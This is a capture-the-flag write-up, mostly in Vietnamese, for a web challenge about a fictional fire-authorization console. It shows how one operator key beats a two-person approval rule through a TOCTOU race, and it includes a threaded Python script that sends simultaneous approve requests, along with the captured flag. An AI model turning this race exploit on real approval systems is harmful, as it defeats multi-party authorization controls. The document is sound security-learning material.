---
{
  title: Two-Key Turn,
  date: 2026-11-08,
  ctf: CSCTF 2026,
  category: web,
  difficulty: Silver 3,
  tags:
    [
      Race Condition,
      Broken Access Control,
      Auth Bypass,
      TOCTOU,
      Multithreading
    ]
}
---

# Đề bài 
Kessara's coastal fire-authorization console arms a fire order only when two DISTINCT officers approve it — the two-person rule. A hostile insider holds one officer's credentials (VEGA-7). One order is still awaiting authorization: drive it to ARMED with your single credential and read its arming authorization.


The API is self-describing at `GET /schema`. Your operator key is `opk_vega7_2f4b9c17e0a3` — send it as `Authorization: Bearer <key>`. Interact only with your assigned instance.


Flag format: `CSCTF{...}`
# Solution
Truy cập challenge
![image.png](./image.png)
Truy cập `/schema`
```json
{
  "service": "Kessaran Fire-Authorization Console",
  "authorization_model": {
    "two_person_rule": "an order arms only when TWO DISTINCT officers have each cast APPROVE (required_approvals = 2)",
    "approve": "idempotent per officer while an approval window is pending",
    "pending_ttl_seconds": 8,
    "concurrent_action": "an ordinary 6–8 separate-connection approval burst is supported",
    "auth": "send your issued operator key as Authorization: Bearer \u003Coperator_key\u003E"
  },
  "routes": {
    "GET /schema": "this document",
    "GET /orders": "list fire orders and retry information",
    "GET /orders/{id}": "order detail; arming_authorization appears only after ARMED",
    "POST /orders/{id}/approve": {
      "auth": "Bearer operator key required",
      "body": "none",
      "note": "cast one approval on the order"
    }
  },
  "your_officer": "VEGA-7",
  "issued_operator_credential": "opk_vega7_2f4b9c17e0a3",
  "arming_authorization": "returned on the target order detail once it reaches ARMED",
  "authorization_format": "a fresh opaque authorization token, unique per instance"
}
```
Theo như đề và `/schema` thì ta cần đạt được 2 lần `approve` để đạt được `ARMED `, nhưng ta chỉ biết được 1 `operator key` là `opk_vega7_2f4b9c17e0a3`

Để đạt được `approve`, ta cần gửi `POST /orders/{id}/approve` với header `Authorization: Bearer opk_vega7_2f4b9c17e0a3`, vậy trước tiên kiểm tra list fire orders qua `/orders` đã
```json
{
  "orders": [
    {
      "id": "AO-7D31C9",
      "ref": "FO-38B7A1",
      "battery": "Coastal Battery 3 (Saltmarsh)",
      "status": "PENDING_AUTH",
      "approvals": 0,
      "required_approvals": 2,
      "retry_after_ms": null
    },
    {
      "id": "AO-19F4E2",
      "ref": "FO-0C6D9E",
      "battery": "Coastal Battery 1 (Harborhead)",
      "status": "REJECTED",
      "approvals": 0,
      "required_approvals": 2,
      "retry_after_ms": null
    },
    {
      "id": "AO-A8C506",
      "ref": "FO-D12B40",
      "battery": "Coastal Battery 2 (Dunmoor)",
      "status": "EXECUTED",
      "approvals": 0,
      "required_approvals": 2,
      "retry_after_ms": null
    },
    {
      "id": "AO-CE472A",
      "ref": "FO-6E01D3",
      "battery": "Coastal Battery 3 (Saltmarsh)",
      "status": "DRAFT",
      "approvals": 0,
      "required_approvals": 2,
      "retry_after_ms": null
    }
  ]
}
```
-> Có được danh sách 4 id là `["AO-7D31C9","AO-19F4E2","AO-A8C506","AO-CE472A"]`

Vậy giờ ta thử `POST /orders/AO-7D31C9/approve` với header `Authorization: Bearer opk_vega7_2f4b9c17e0a3`
![2-image.png](./2-image.png)

:::info
- `approvals` = số lượng approval đang đếm trong cửa sổ hiện tại `(= len(approval_records)` của epoch đó). Cần đạt `required_approvals=2` để ARM.
- `approval_epoch` = số thứ tự cửa sổ duyệt. Mỗi "approval window" có TTL 8s (pending_ttl_seconds). Window hết hạn → epoch tăng 1, `approval` cũ bỏ, đếm lại từ đầu.
![3-image.png](./3-image.png)
`approvals` là đếm bao nhiêu, `approval_epoch` là lượt/cửa sổ nào.
:::

Vậy giờ ta thử gửi POST 2 lần liên tiếp 
![4-image.png](./4-image.png)
Ta nhận thấy rằng chương trình kiểm tra xem state `officer đó đã approve cho order này chưa` và sau đó thực hiện hành động dựa trên kết quả kiểm tra đó là từ chối với `officer` cũ hoặc approve lần 2 cho `officer` khác
-> Có khả năng dính lỗi bảo mật `TOCTOU`
:::info
`TOCTOU` (Time-of-Check to Time-of-Use) là một lỗi bảo mật thuộc dạng `race condition`. Lỗi này xảy ra khi chương trình kiểm tra trạng thái của một tài nguyên (như quyền truy cập file hoặc thông tin xác thực) và sau đó thực hiện hành động dựa trên kết quả kiểm tra đó, nhưng trạng thái tài nguyên lại thay đổi trong khoảng thời gian ngắn giữa bước kiểm tra và bước sử dụng.
:::
Ta sử dụng script python [race condition](https://medium.com/yavar/understanding-race-conditions-in-python-and-how-to-handle-them-98f998708b2c) để burst nhiều request vào trong một khoảng thời gian ngắn nhằm bypass cách kiểm tra này của chương trình

```python3
import requests
import threading

id_list=["AO-7D31C9","AO-19F4E2","AO-A8C506","AO-CE472A"]
BASE_URL = "http://w01.ctf.chronos-security.ro:43886"
headers = {
        "Host": "w01.ctf.chronos-security.ro:43886",
        "Accept-Language": "vi-VN,vi;q=0.9",
        "Authorization": "Bearer opk_vega7_2f4b9c17e0a3",
        "Connection": "keep-alive"
}

def burst(oid, n):
    out = [None] * n                     # list lưu response của n request
    start = threading.Barrier(n)         # điểm hẹn: đợi đủ n thread rồi thả cùng lúc

    def one(i):
        start.wait()                     # đứng đợi tới khi đủ n thread cùng tới vạch
        try:
            # gửi 1 request approve; lưu response vào slot thứ i
            out[i] = requests.post(f"{BASE_URL}/orders/{oid}/approve", headers=headers, timeout=20)
        except Exception as e:
            out[i] = e                   # request lỗi thì lưu lại exception

    # tạo n thread
    threads = []
    for i in range(n):
        t = threading.Thread(target=one, args=[i])
        threads.append(t)  
    for t in threads:
        t.start()                        # khởi động tất cả thread
    for t in threads:
        t.join()                         # đợi tất cả gửi xong
    return out

for i in id_list:
    res = burst(i, 2)
    for r in res:
        if hasattr(r, "status_code") and r.status_code == 200:
            print(f"{r.text}")
    try:
        print(requests.get(BASE_URL + "/orders/"+i).json()["arming_authorization"])
    except KeyError:
        pass
```
:::info
Để `race condition` thì ta sử dụng thư viện [threading](https://docs.python.org/3/library/threading.html#introduction) để tạo nhiều luồng thực thi song song với nhau trong cùng 1 chương trình, mỗi thread làm việc của nó độc lập, "cùng lúc" với thread khác.
:::
![6-image.png](./6-image.png)
-> Flag: 
`CSCTF{XothtuwkKTokd5V8pXo2koUW}`
